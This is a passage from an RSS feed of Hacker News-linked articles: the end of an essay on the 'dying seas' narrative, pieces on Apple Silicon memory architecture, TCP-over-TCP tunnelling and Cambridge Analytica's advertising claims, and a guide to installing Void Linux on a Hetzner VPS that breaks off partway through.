<p>Although hampering science communication, the dying-seas narrative may also contribute to misguided efforts at environmental restoration. In 2012 a native community on Haida Gwaii paid $2.5 million to an American entrepreneur to carry out an iron-seeding experiment off the coast of British Columbia. The goal was to dump iron dust into the sea to artificially trigger a plankton bloom and restore the local salmon population while also sequestering carbon dioxide. As mentioned earlier, oceanographers pioneered iron-seeding experiments but came to deem the method as too risky for practical use. The Haida Gwaii iron-seeding project was therefore condemned by the international scientific community as having violated two international agreements to place checks on unregulated geoengineering. Yet a lay public that was sold on <em>saving </em>a â€œdying seaâ€� triggered what many in the scientific community saw to be dangerous â€œrogue science.â€� Nor is the 2012 iron-seeding event the only scientifically questionable technological solution marketed as a solution for marine ecological crises. A far more ambitious engineering project to skim microplastics from the North Pacific sea surface is now being tested. The Ocean Cleanup project was founded by a teenage Dutch inventor who, after delivering a viral TEDx speech and raising $2.2 million in crowdsourced funding, dropped out of university to develop his project. Despite concerns voiced by oceanographers that the device will not only be ineffective but will harm pelagic marine creatures, the installation was deployed in late 2018.
On a much smaller scale, millions of dollars have been invested in engineering projects around the world in the Sisyphean task of trying to hold back rising seas as the Greenland and Antarctic ice sheets melt. It may be that future oceanographers, unlike their predecessors, will be less focused on encouragement of widespread collaborative observation and experimentation at sea and more concerned with oversight and restriction of interfering scientific and engineering practices.&nbsp;</p>
<p>Unsurprisingly, the projection of sentience onto the natural world fails to move climate change skeptics. Appeals to safeguard individual charismatic species, like the polar bear, risk critique as devaluing human existence in favor of other forms of life. Descriptions of the earth as a victim of human agency are dismissed by political opponents as scientific hubris. Even publics potentially receptive to conservation science risk being demoralized by imaginative invocation of a vast, â€œdyingâ€� non-human entity. The author of a 2014 editorial in <em>Smithsonian Magazine </em>notes, â€œWeâ€™ve gone from thinking the ocean was too big to hurt, to thinking that the ocean is too big and too sick to help.â€� This cognitive-emotional orientation has been unintentionally fostered by scientists intent on educating a lay public on the importance of global systems thinking. Yet the popularization of this approach to nature has its pitfalls. Conceptualizing the oceans as a cohesive nonhuman entity oversimplifies accounts of environmental degradation and limits understanding of local variability.&nbsp;</p>
<p>In 2013, Microsoft cofounder Paul Allen announced a contest called Ocean Challenge. The contest awarded â€œ$10,000 to the most promising new science-based concept for mitigating environmental and/or societal impacts of ocean acidification.â€� The winners of the contest were Ruth D. Gates of the University of Hawaii and Madeleine van Oppen of the Australian Institute of Marine Science. Their project to genetically select and cultivate corals that possess natural resistance to ocean acidification received funding. Coral reefs take up less than 1 percent of the earthâ€™s surface, yet they are habitats for an estimated one-third of all known marine creatures, including 25 percent of commercial seafood species. They also act as natural breakwaters, dampening the power of storm surges and coastal erosion. An estimated 61 percent of coral reefs are under stress and at risk of disappearing by 2030. Thus, the health of coral reefs is widely used as a metric for global ocean health, the marine equivalent of the canary in the coal mine. Gates, who passed away in October 2018, described herself as â€œa futurist.â€� â€œA lot of people want to go back to something. They think, If we just stop doing things, maybe the reef will come back to what it was,â€� she explained. In contrast, her project acknowledged a future â€œwhere nature is no longer fully natural.â€� In Gatesâ€™s understanding, the ocean isnâ€™t dead, but its survival hinges on assumption of responsibility for its now-hybrid character. Is there a cost to abandoning the nineteenth-century ideal of wilderness? Perhaps doing so is the price we must pay to retain a semblance of what once was.&nbsp;</p>
<figure><img src="https://s3.amazonaws.com/nautilus-vertical/oceans_6dede823a3aee1159948a355f8d25912.jpg" alt="Screen Shot 2020-11-11 at 9.06.26 PM"><figcaption><span>Detail from a mural by Louis Masai in Shoreditch, London. </span><br><span><a href="https://www.flickr.com/photos/maureen_barlin/21563934214/in/photolist-yRwNnd-nBHi7g-J1mTKy-uR5dZN-yKkUdq-ZpCe1C-tWo3oY-zcVVAU-z1WCtb-vx1TMN-A7rnFd-f8wmYU-tWnYzA-uToKiz-dQNque-HWgEzz">Maureen Barlin</a>. </span></figcaption></figure>
<p>Some theorists and scientists advocate greater inclusion of nonhuman actors in debates about ecological crisis. Bruno Latour, for example, argues that â€œa science of objects and politics of subjectsâ€� must be replaced by a â€œpolitical ecology of collectives consisting of humans and nonhumans.â€� A precedent has been set by the recent allocation of legal rights to rivers in Australia, New Zealand, and India. But although we must not shirk from placing value on nonhuman entities, in the end climate change—and by extension marine environmental degradation—remains a human problem, and we need to foreground human abilities to comprehend and solve it. As Jean-Michel Cousteau, son of Jacques, asserts, â€œThe face of our planet is the ocean. It is the largest ecosystem on our Earth. But the face of climate change is not the whale, the polar bear, the glacier, the rainforest or the desert. The face of climate change is us.â€�&nbsp;<br></p>
<p>The marine sciences, like all branches of scientific knowledge, are shaped by underlying assumptions about human relationship with the natural world. The tensions I have highlighted point to a crisis in scientific and lay imaginations of an ocean radically changed in the course of the Anthropocene. Scientists increasingly talk about the ocean as a hybrid environment. Gates was surely correct in asserting that scientific solutions for an ocean understood as dying can be reached only by acknowledging that the contemporary ocean cannot be conceived apart …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://oceans.nautil.us/feature/637/the-dying-seas-of-the-anthropocene">http://oceans.nautil.us/feature/637/the-dying-seas-of-the-anthropocene</a></em></p>]]>
            </description>
            <link>http://oceans.nautil.us/feature/637/the-dying-seas-of-the-anthropocene</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080998</guid>
            <pubDate>Fri, 13 Nov 2020 10:44:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple Silicon, Xeon Phi, and Amigas]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25080913">thread link</a>) | @ingve
<br/>
November 13, 2020 | https://www.sicpers.info/2020/11/apple-silicon-xeon-phi-and-amigas/ | <a href="https://web.archive.org/web/*/https://www.sicpers.info/2020/11/apple-silicon-xeon-phi-and-amigas/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>The new <a href="https://www.macworld.co.uk/news/how-good-is-apples-m1-chip-really-3797893/">M1 chip in the new Macs</a> has 8-16GB of DRAM on the package, just like many mobile phones or single-board computers. But unlike many desktop, laptop or workstation computers (there are exceptions). In the first tranche of Macs using the chip, that’s all the addressable RAM they have (i.e. ignoring caches), just like many mobile phones or single-board computers. But what happens when they move the Apple Silicon chips up the scale, to computers like the iMac or Mac Pro?</p>
<p>It’s possible that these models would have a few GB of memory on-package <em>and</em> access to memory modules connected via a conventional controller, for example DDR4 RAM. They almost certainly would if you could deploy <em>multiple</em> M1 (or successor) packages on a single system. Such a Mac would be a non-uniform memory access architecture (NUMA), which (depending on how it’s configured) has implications for how software can be designed to best make use of the memory.</p>
<p>NUMA computing is of course not new. If you have a computer with a CPU and a discrete graphics processor, you have a NUMA computer: the GPU has access to RAM that the CPU doesn’t, and vice versa. Running GPU code involves copying data from CPU-memory to GPU-memory, doing GPU stuff, then copying the result from GPU-memory to CPU-memory.</p>
<p>A hypothetical NUMA-because-Apple-Silicon Mac would not be like that. The GPU shares access to the integrated RAM with the CPU, a little like an Amiga. The situation on Amiga was that there was “chip RAM” (which both the CPU and graphics and other peripheral chips could access), and “fast RAM” (only available to the CPU). The fast RAM was faster because the CPU didn’t have to wait for the coprocessors to use it, whereas they had to take turns accessing the chip RAM. Nonetheless, the CPU had access to all the RAM, and programmers had to tell `AllocMem` whether they wanted to use chip RAM, fast RAM, or didn’t care.</p>
<p>A NUMA Mac would not be like that, either. It would share the property that there’s a subset of the RAM available for sharing with the GPU, but this memory would be faster than the off-chip memory because of the closer integration and lack of (relatively) long communication bus. Apple has described the integrated RAM as “high bandwidth”, which probably means multiple access channels.</p>
<p>A better and more recently analogy to this setup is Intel’s discontinued supercomputer chip, <a href="https://www.anandtech.com/show/8217/intels-knights-landing-coprocessor-detailed">Knight’s Landing</a> (marketed as Xeon Phi). Like the M1, this chip has 16GB of on-die high bandwidth memory. Like my hypothetical Mac Pro, it can also access external memory modules. Unlike the M1, it has 64 or 72 identical cores rather than 4 big and 4 little cores.</p>
<p>There are three ways to configure a Xeon Phi computer. You can not use any external memory, and the CPU entirely uses its on-package RAM. You can use a cache mode, where the software only “sees” the external memory and the high-bandwidth RAM is used as a cache. Or you can go full NUMA, where programmers have to explicitly request memory in the high-bandwidth region to access it, like with the Amiga allocator.</p>
<p>People rarely go full NUMA. It’s hard to work out what split of allocations between the high-bandwidth and regular RAM yields best performance, so people tend to just run with cached mode and hope that’s faster than not having any on-package memory at all.</p>
<p>And that makes me think that a Mac would either not go full NUMA, or would not have public API for it. <em>Maybe</em> Apple would let the kernel and some OS processes have exclusive access to the on-package RAM, but even that seems overly complex (particularly where you have more than one M1 in a computer, so you need to specify core affinity for your memory allocations in addition to memory type). My guess is that an early workstation Mac with 16GB of M1 RAM and 64GB of DDR4 RAM would look like it has 64GB of RAM, with the on-package memory used for the GPU and as cache. NUMA APIs, if they come at all, would come later.</p>
	</div></div>]]>
            </description>
            <link>https://www.sicpers.info/2020/11/apple-silicon-xeon-phi-and-amigas/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080913</guid>
            <pubDate>Fri, 13 Nov 2020 10:26:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why TCP over TCP is a bad idea (2001)]]>
            </title>
            <description>
<![CDATA[
Score 48 | Comments 13 (<a href="https://news.ycombinator.com/item?id=25080693">thread link</a>) | @fanf2
<br/>
November 13, 2020 | http://sites.inka.de/~bigred/devel/tcp-tcp.html | <a href="https://web.archive.org/web/*/http://sites.inka.de/~bigred/devel/tcp-tcp.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    
    <p>
      A frequently occurring idea for IP tunneling applications is to
      run a protocol like PPP, which encapsulates IP packets in a
      format suited for a stream transport (like a modem line), over a
      TCP-based connection. This would be an easy solution for
      encrypting tunnels by running <em>PPP over SSH</em>, for which
      several recommendations already exist (one in the Linux HOWTO
      base, one on my own website, and surely several others). It
      would also be an easy way to compress arbitrary IP traffic,
      while datagram based compression has hard to overcome efficiency
      limits.
    </p><p>
      Unfortunately, it doesn't work well. Long delays and frequent
      connection aborts are to be expected. Here is why.

    </p><h2>TCP's retransmission algorithm</h2>
    <p>
      TCP divides the data stream into <em>segments</em> which are
      sent as individual IP datagrams. The segments carry a
      <em>sequence number</em> which numbers the bytes in the stream,
      and an <em>acknowledge number</em> which tells the other side
      the last received sequence number. [RFC793]
    </p><p>
      Since IP datagrams may be lost, duplicated or reordered, the
      sequence numbers are used to reassemble the stream. The
      acknowledge number tells the sender, indirectly, if a segment
      was lost: when an acknowledge for a recently sent segment does
      not arrive in a certain amount of time, the sender assumes a
      lost packet and re-sends that segment.
    </p><p>
      Many other protocols using a similar approach, designed mostly
      for use over lines with relatively fixed bandwidth, have the
      "certain amount of time" fixed or configurable. In the Internet
      however, parameters like bandwidth, delay and loss rate are
      vastly different from one connection to another and even
      changing over time on a single connection. A fixed timeout in
      the seconds range would be inappropriate on a fast LAN and
      likewise inappropriate on a congested international link. In
      fact, it would increase the congestion and lead to an effect
      known as "meltdown".
    </p><p>
      For this reason, TCP uses adaptive timeouts for all
      timing-related parameters. They start at conservative estimates
      and change dynamically with every received segment. The actual
      algorithms used are described in [RFC2001]. The details are not
      important here but one critical property: <em>when a segment
      timeouts, the following timeout is increased</em>
      (exponentially, in fact, because that has been shown to avoid
      the meltdown effect).

    </p><h2>Stacking TCPs</h2>
    <p>
      The TCP timeout policy works fine in the Internet over a vast
      range of different connection characteristics. Because TCP tries
      very hard not to break connections, the timeout can increase up
      to the range of several minutes. This is just what is sensible
      for unattended bulk data transfer. (For interactive
      applications, such slow connections are of course undesirable
      and likely the user will terminate them.)
    </p><p>
      This optimization for reliability breaks when stacking one TCP
      connection on top of another, which was never anticipated by the
      TCP designers. But it happens when running PPP over SSH or
      another TCP-based protocol, because the PPP-encapsulated
      IP datagrams likely carry TCP-based payload, like this:
    </p><p>
      <img src="http://sites.inka.de/~bigred/devel/tcp-tcp.png" width="371" height="270" alt="(TCP over IP over PPP over SSH over TCP over IP)">
    </p><p>
      Note that the upper and the lower layer TCP have different
      timers. When an upper layer connection starts fast, its timers
      are fast too. Now it can happen that the lower connection has
      slower timers, perhaps as a leftover from a period with a
      slow or unreliable base connection.
    </p><p>
      Imagine what happens when, in this situation, the base
      connection starts losing packets. The lower layer TCP queues up
      a retransmission and increases its timeouts. Since the
      connection is blocked for this amount of time, the upper layer
      (i.e. payload) TCP won't get a timely ACK, and will also queue a
      retransmission. Because the timeout is still less than the lower
      layer timeout, <em>the upper layer will queue up more
      retransmissions faster than the lower layer can process
      them</em>. This makes the upper layer connection stall very
      quickly and every retransmission just adds to the problem - an
      internal meltdown effect.
    </p><p>
      TCPs reliability provisions backfire here. The upper layer
      retransmissions are completely unnecessary, since the carrier
      guarantees delivery - but the upper layer TCP can't know this,
      because TCP always assumes an unreliable carrier.

    </p><h2>Practical experience</h2>
    <p>
      The whole problem was the original incentive to start the <a href="http://sites.inka.de/~bigred/devel/cipe.html">CIPE</a>
      project, because I used a PPP over SSH solution for some time
      and it proved to be fairly unusable. At that time it had to run
      over an optical link which suffered frequent packet loss,
      sometimes 10-20% over an extended period of time. With plain
      TCP, this was just bearable (because the link was not
      congested), but with the stacked protocols, connections would
      get really slow and then break very frequently.

    </p><p>
      This is the detailed reason why CIPE uses a datagram carrier.
      (The choice for UDP, instead of another IP-level protocol like
      IPsec does, is for several reasons: this allows to distinguish
      tunnels by their port number, and it adds the ability to run
      over SOCKS.) The datagram carrier has exactly the same
      characteristics as plain IP, for which TCP was designed to run
      over.

    </p><hr>
    <address><a href="mailto:olaf@bigred.inka.de">Olaf Titz</a></address>
<!-- Created: Sun Oct 10 20:56:27 CEST 1999 -->
<!-- hhmts start -->
Last modified: Mon Apr 23 11:50:59 CEST 2001
<!-- hhmts end -->
  

</div>]]>
            </description>
            <link>http://sites.inka.de/~bigred/devel/tcp-tcp.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080693</guid>
            <pubDate>Fri, 13 Nov 2020 09:43:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Thoughts on the Cambridge Analytica Scandal]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25080591">thread link</a>) | @sobradob
<br/>
November 13, 2020 | http://boazsobrado.com/blog/2020/11/07/my-thoughts-on-cambridge-analytica/ | <a href="https://web.archive.org/web/*/http://boazsobrado.com/blog/2020/11/07/my-thoughts-on-cambridge-analytica/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>
    
    <p><span>Nov 7, 2020 · 6 minute read
    
    <br>
    <a href="http://boazsobrado.com/categories/facebook">Facebook</a><a href="http://boazsobrado.com/categories/advertising">Advertising</a><a href="http://boazsobrado.com/categories/trump">Trump</a><a href="http://boazsobrado.com/categories/cambridge-analytica">Cambridge Analytica</a>
    </span></p><p>I am writing this to share my conclusions regarding the Cambridge Analytica affair. I have a somewhat unique perspective on the topic for three reasons:</p>

<ul>
<li>My day job consists of measuring the effectiveness of digital advertising.</li>
<li>I have first hand experience with the technology and methods that Cambridge Analytica claims to have used.</li>
<li>I played a small role in unearthing the Cambridge Analytica scandal.</li>
</ul>

<h2 id="what-cambridge-analytica-supposedly-did">What Cambridge Analytica supposedly did</h2>

<p>The New Statesmen’s Laurie Clarke puts it in the <a href="https://www.newstatesman.com/science-tech/social-media/2020/10/how-cambridge-analytica-scandal-unravelled">following way</a>:</p>

<blockquote>
<p>CA was alleged to have mined Facebook data from millions of people worldwide. The data was detailed enough for CA to create complex psychographic profiles of its subjects, to deliver pinpointed adverts to them and propel them into new behaviour patterns. The CA whistleblower Christopher Wylie described it as “Steve Bannon’s psychological warfare mind-fuck tool”. </p>
</blockquote>

<p>In the Netflix documentary <em>The Great Hack</em> Brittany Kaiser, the former business development executive of Cambridge Analytica says:</p>

<blockquote>
<p>“If we targeted enough persuadable people in the right precincts, then those states would turn red instead of blue… We bombarded them through blogs, websites, articles, videos on every platform you can imagine until they saw the world the way we wanted them to – until they voted for our candidate.”</p>
</blockquote>

<p>The implication here being that two of the greates political upsets of the last decade (Brexit &amp; Trump) were due to the advanced persuasion technology that Cambridge Analytica sold to the highest bidder.</p>

<p>My concern is that a lot of people seem to focus on a scary technology called psychographic advertising (also known as psychographic or&nbsp;<a href="https://hbr.org/2018/05/what-marketers-should-know-about-personality-based-marketing">personality marketing</a>) that purportedly allowed Cambridge Analytica to manipulate people by serving them ads tailored to their individual personality. My argument is that this technology is mostly ineffective in the context of modern digital advertising and is unlikely to have had the influence attributed to it. Moreover, it distracts from the true issues at stake, such as data privacy in the days of “<a href="https://www.theguardian.com/technology/2019/jan/20/shoshana-zuboff-age-of-surveillance-capitalism-google-facebook">surveillance capitalism</a>”.</p>

<h2 id="my-role-in-the-story">My role in the story</h2>

<p>Between 2012 and 2014 I did some work at the Cambridge University Psychometric Centre in as an undergraduate, and I met in person Alex Kogan and a lot of the people who were mentioned in the&nbsp;<a href="https://www.michalkosinski.com/clown-show">books</a>&nbsp;and&nbsp;<a href="https://www.nytimes.com/2018/03/17/us/politics/cambridge-analytica-trump-campaign.html">articles</a>&nbsp;that have been written about the whole scandal. While at Cambridge I had access to key parts of the data set that inspired Cambridge Analytica’s work.</p>

<p>In 2015 I spent some time at Stanford, where I recruited several well-known brands (who I presume would rather not be named) to test psychographic marketing in a commercial setting. While doing my research on psychographic marketing, I discovered that a little known company called Cambridge Analytica was working with Ted Cruz on psychometric targeting in digital advertising.</p>

<p>I pointed this out to&nbsp;<a href="https://www.michalkosinski.com/">Dr Michal Kosinski</a>, who was familiar with the unethical way in which the Cambridge Analytica had collected its data. Michal then got in touch with a journalist at the Guardian, who produced the&nbsp;<a href="https://www.theguardian.com/us-news/2015/dec/11/senator-ted-cruz-president-campaign-facebook-user-data">first article</a>&nbsp;in what later became known as the Cambridge Analytica scandal in December 2015.</p>

<p>Eventually I failed to get psychographic advertising to work for commercial purposes in 2015 and moved on to other projects. Since then, I’ve also spoken to other teams that spent years trying to get a commercially viable personality marketing to work, who also failed. As far as I know, Facebook also ran some tests internally and decided not to proceed with it in early 2015. From this I drew the conclusion was that psychographic marketing doesn’t&nbsp;<strong>really</strong>&nbsp;work, particularly not in the way Cambridge Analytica claimed it did. Let me illustrate why by looking at one of the key scientific papers on personality marketing.</p>

<h2 id="what-the-science-says">What the science says</h2>

<p>This&nbsp;<a href="https://www.pnas.org/content/114/48/12714/">paper</a>&nbsp;was written by Sandra Matz and friends. The experiments they describe are clever: studies 1 and 2 show that you can target high individuals who score highly along a certain personality dimension (say, are extroverted), and that these individuals respond better to messages crafted for their end of the dimension than the opposite dimension (e.g. highly extroverted people respond better to high extroversion crafted messages than low extroversion messages). In study 3, they show that a psychologically targeted message towards introverts performed better than the copy used by a company previously.</p>

<p>This study is important in that it demonstrates three things:</p>

<ul>
<li>It is possible to target people online based on their personality</li>
<li>It is possible to tailor messages to people online based on their personality, and these messages perform better than those tailored for people with an opposite personality.</li>
</ul>

<p>What Sandra’s paper does not show, is that psychographic advertising performs better than standard methods used in digital advertising. In my experience it does not, and I can explain why.</p>

<p>Personality based advertising is based on a simple five dimensional model of human beings, designed to explain behaviours as diverse as reading books and going to clubs. Facebooks machine learning algorithms create a high dimensional model finely tuned with thousands of data points trying to optimise for very specific outcomes, such as purchasing a MAGA hat. The former is a general descriptive model built using statistical methods of the mid 20th century, with some but overall limited predictive general validity. The latter is a highly specialised machine learning model, with little descriptive power, but lot more accurate at predicting specific behaviours like the purchases of haircuts.</p>

<h2 id="digital-advertising-in-practice">Digital advertising in practice</h2>

<p>Keeping that in mind, which of these two digital approaches do you think will yield better results?</p>

<ul>
<li>Approach A: Summon the best psychologists and copywriters in the world to write copy that will get extroverted people to purchase a brand of deodorant. Target highly extroverted people on Facebook with that copy by advertising to people who have “liked” highly extroverted pages.</li>
<li>Approach B: Using Facebook’s machine learning algorithms generate a Lookalike audience based on previous purchasers on your site. Target these people with thousands of different types of programmatically generated messages, and focus on the better performing ones.</li>
</ul>

<p>When I researched this in 2015 I found that Approach B will perform better at all times. In fact, Approach B is more like what Trump&nbsp;<a href="https://www.theatlantic.com/technology/archive/2020/04/how-facebooks-ad-technology-helps-trump-win/606403/">actually did in 2016</a>:</p>

<p><em>“During the 2016 election cycle, Trump’s team ran 5.9 million ads on Facebook, spending $44 million from June to November alone. Hillary Clinton’s campaign ran only 66,000.”</em></p>

<p>Instead of trying a fancy secret sauce on how to design creatives and how to target them Trump’s team just threw everything at the algorithm and stuck with the ads that performed the best. All the psychological theory in the world has limited efficiency compared to the AI powering Facebook’s ad optimisations.</p>

<h2 id="so-what-do-i-think">So what do I think?</h2>

<p>In conclusion, it is not that psychographic advertising doesn’t work at all. The science behind it is solid, and it is worthy of study. My point is that psychographic advertising afforded Cambridge Analytica little to no advantage at all. Cambridge Analytica was working with more or less the same technology as their competitors. Most of the outlandish claims made by Cambridge Analytica were just branding, and subsequently sensationalism by reporting journalists. These are not just my conclusions by the way, they are also the findings of the&nbsp;<a href="https://ico.org.uk/media/action-weve-taken/2618383/20201002_ico-o-ed-l-rtl-0181_to-julian-knight-mp.pdf">British Information Commissioner’s Office</a>&nbsp;(excellent summary&nbsp;<a href="https://twitter.com/nickconfessore/status/1313853996168351747">here</a>). The “secret sauce” part of this affair should not distract from the wide scale data harvesting of large tech monopolies and the data privacy issues that arise from it.</p>

  </div>
  
</div></div>]]>
            </description>
            <link>http://boazsobrado.com/blog/2020/11/07/my-thoughts-on-cambridge-analytica/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080591</guid>
            <pubDate>Fri, 13 Nov 2020 09:22:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Installing Void Linux on a Hetzner Cloud VPS]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25080543">thread link</a>) | @0x0f0f0f
<br/>
November 13, 2020 | https://0x0f0f0f.github.io/posts/2020/11/supercharge-your-cloud-1-installing-void-linux-on-hetzner-vpss/ | <a href="https://web.archive.org/web/*/https://0x0f0f0f.github.io/posts/2020/11/supercharge-your-cloud-1-installing-void-linux-on-hetzner-vpss/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>Systemd sucks <sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>, <sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>, <sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>, <sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>, <sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup> but <a href="https://cloud.hetzner.com/">Hetzner Cloud</a> rocks, and is one of my favourite VPS providers.
Hetzner has been providing Debian, Arch Linux, Ubuntu and CentOS images for cloud VPS instances, but wait!
They all use systemd! I have been using Void Linux for years now on mostly all of my devices. I have even
built a PDA that runs Void Linux <sup id="fnref:6"><a href="#fn:6" role="doc-noteref">6</a></sup>.</p>
<p>Those days,  I was building a personal cloud instance with a few servers (more details in the following write-up posts),
and I ran into some very annoying issues that were directly caused by the unnecessary complexity of systemd. Docker was definitely resource overkill for this task.</p>
<p>Let’s jump straight to the guide on how to install Void Linux on a Hetzner Cloud VPS instance.</p>
<h2 id="rescue-mode">Rescue Mode</h2>
<p>The first step is to create a server on your Hetzner Cloud account. Choose Ubuntu as the initial OS image choice.
Do not add any volume or SSH key in the initial configuration wizard, as those will have to be manually managed after installing Void.
Do not upload anything on the server. The root partition will be formatted and wiped out!</p>
<p>After installing, turn off the server and boot in rescue mode.</p>
<p><img src="https://0x0f0f0f.github.io/posts/images/hetzner1.png" alt="/posts/images/hetzner1.png"></p>
<p>You will be provided with an username (<code>root</code>) and a password for the rescue system. Copy this password somewhere!</p>
<p>Now is time to login into the rescue system by SSH-ing into the server, as you would normally do with the IPv4 address that Hetzner shows at the top of the server page:</p>
<div><pre><code data-lang="sh">ssh root@your-server-ipv4-address
</code></pre></div><h2 id="unpacking-the-tarball">Unpacking the tarball</h2>
<p>Login with the password Hetzner has just provided you, and run the <code>installimage</code> script. The following menu will be shown, choose
custom_image.</p>
<p><img src="https://0x0f0f0f.github.io/posts/images/hetzner2.png" alt="/posts/images/hetzner2.png"></p>
<p><code>installimage</code> will then open an editor with a configuration file.
Scroll down to the line containing <code>HOSTNAME</code> and change the value to the machine hostname you are going to set later.</p>
<p>Time to choose what image to install on the server! We will need a ROOTFS tarball of the system. I have not tested the <code>musl</code> version
and therefore I cannot recommend to use it. The standard <code>glibc</code> version works very fine for me.</p>
<p>Go on the Void Linux downloads repository <sup id="fnref:7"><a href="#fn:7" role="doc-noteref">7</a></sup>, scroll down at the very end and <strong>copy the link</strong>
of the x86_64 ROOTFS tarball. The file name will be something like this¸
but the build date will obviously become different in the future.</p>
<pre><code>void-x86_64-ROOTFS-20191109.tar.xz
</code></pre><p>Be sure that the URL you have been copied looks like this:</p>
<pre><code>https://alpha.de.repo.voidlinux.org/live/current/void-x86_64-ROOTFS-20191109.tar.xz
</code></pre><p>Now, go back to your rescue system SSH session, where we left it at the <code>installimage</code> config editor,
scroll down at the end of the config file, at the line starting with <code>IMAGE</code>, and paste
the Void Linux ROOTFS tarball URL after the word <code>IMAGE</code>, on the same line, like this:</p>
<pre><code>IMAGE https://alpha.de.repo.voidlinux.org/live/current/void-x86_64-ROOTFS-20191109.tar.xz
</code></pre><p>You could change other settings in the config file, such as the disks partitioning,
but for simplicity I have been sticking with the default, single root ext4 partition.</p>
<p>Press F2 to save and then press F10 to exit. Hetzner’s <code>installimage</code> script will format
the <code>/dev/sda</code> and unpack the Void tarball automatically. It will probably fail at the end, but
don’t worry!</p>
<h2 id="chroot-time">Chroot time!</h2>
<p>Now, the installer will probably exit with an error.
We should be fine if it has unpacked the tarball correctly in the <code>/dev/sda1</code> partition.
Now check if there is an ext4 partition in there, run:</p>
<p>Now, mount it to <code>/mnt</code>.</p>
<p>Check if <code>/mnt/</code> contains the Void ROOTFS tarball contents.</p>
<p>The rest of the guide is pretty much the guide for installing Void from chroot <sup id="fnref:8"><a href="#fn:8" role="doc-noteref">8</a></sup>, but is not identical!
Some steps are different (or not needed).
Though, I will still report the rest of the steps you need for setting up your Void VPS on Hetzner.</p>
<p>Mount the pseudo-filesystems needed for a chroot:</p>
<div><pre><code data-lang="sh"><span>for</span> i in sys dev proc; <span>do</span> mount --rbind /$i /mnt/$i <span>&amp;&amp;</span> mount --make-rslave /mnt/$i; <span>done</span>
</code></pre></div><p>Copy the DNS configuration into the new root so that XBPS can still download new packages inside the chroot:</p>
<div><pre><code data-lang="sh">cp /etc/resolv.conf /mnt/etc/
</code></pre></div><p>Chroot into the new installation:</p>
<div><pre><code data-lang="sh">PS1<span>=</span><span>'(chroot) # '</span> chroot /mnt/ /bin/bash
</code></pre></div><p>Congrats! You’re in the chroot.</p>
<h2 id="finishing-the-installation">Finishing the installation</h2>
<p>Check the internet connection:</p>
<p>ROOTFS images generally contain out of date software, due to being a snapshot of the time when they were built, and do not come with a complete <code>base-system</code>. Update the package manager and install <code>base-system</code>:</p>
<div><pre><code data-lang="sh">xbps-install -Su xbps
xbps-install -u
xbps-install base-system
xbps-remove base-voidstrap
</code></pre></div><p>Specify the hostname in <code>/etc/hostname</code>. Use the same one you used in the previous step when editing Hetzner <code>installimage</code>’s config:</p>
<div><pre><code data-lang="sh">echo <span>'yourhostname'</span> &gt; /etc/hostname
</code></pre></div><p>For glibc builds, generate locale files with:</p>
<div><pre><code data-lang="sh">xbps-reconfigure -f glibc-locales
</code></pre></div><p>Install your favourite text editor. I’m ok with nano.</p>
<p>Now edit <code>/etc/fstab</code>. This is very simple <code>fstab</code> is OK. See the references <sup id="fnref:9"><a href="#fn:9" role="doc-noteref">9</a></sup> for more.</p>
<pre><code>proc /proc proc defaults 0 0
/dev/sda1 / ext4 defaults,discard 0 0
</code></pre><p>Install GRUB. Hetzner uses DOS disk partitioning.</p>
<pre><code>xbps-install grub
grub-install /dev/sda
</code></pre><p>Use xbps-reconfigure(1) to ensure all installed packages are configured properly:</p>
<p>Congrats! You have now installed Void on Hetzner Cloud.
You will need a couple of config tweaks before rebooting into a working install.
Don’t exit from the <code>chroot</code> shell yet!</p>
<h2 id="final-tweaks">Final tweaks</h2>
<p>While still in the chroot, enable the <code>dhcpcd</code> service:</p>
<div><pre><code data-lang="sh">ln -s /etc/sv/dhcpcd /var/service/
</code></pre></div><p>Enable the <code>sshd</code> service for remote login through SSH.
I suggest you also install <code>ssh-audit</code>, and check out
the awesome SSH HARDENING GUIDES <sup id="fnref:10"><a href="#fn:10" role="doc-noteref">10</a></sup> to ensure that
your Void VPS is safe and sound from unwanted remote logins.</p>
<div><pre><code data-lang="sh">ln -s /etc/sv/sshd /var/service/
</code></pre></div><p>Copy your SSH public key to your local PC clipboard and save it in the VPS root account <code>authorized_keys</code> file,
to later authorize your remote SSH login sessions.</p>
<div><pre><code data-lang="sh">mkdir /root/.ssh
nano /root/.ssh/authorized_keys
<span># paste your PUBLIC key in there and save</span>
</code></pre></div><p>Change the root password</p>
<p>Add an additional user</p>
<div><pre><code data-lang="sh">useradd --shell /bin/bash voiduser
</code></pre></div><p>Change its password</p>
<p>That’s all! Have fun with your Void Linux VPS!</p>
<p>Now run <code>reboot</code> and login with SSH, as usual, into your fresh new Void Linux VPS!</p>
<h2 id="additional-goodies">Additional Goodies</h2>
<p>Uncomplicated Firewall. Don’t enable before allowing the SSH port (change it from 22 to the port you are
using if you changed it in your <code>sshd_config</code>) <sup id="fnref:11"><a href="#fn:11" role="doc-noteref">11</a></sup></p>
<div><pre><code data-lang="sh">xbps-install -S ufw
ln -s /etc/sv/ufw /var/service/ufw
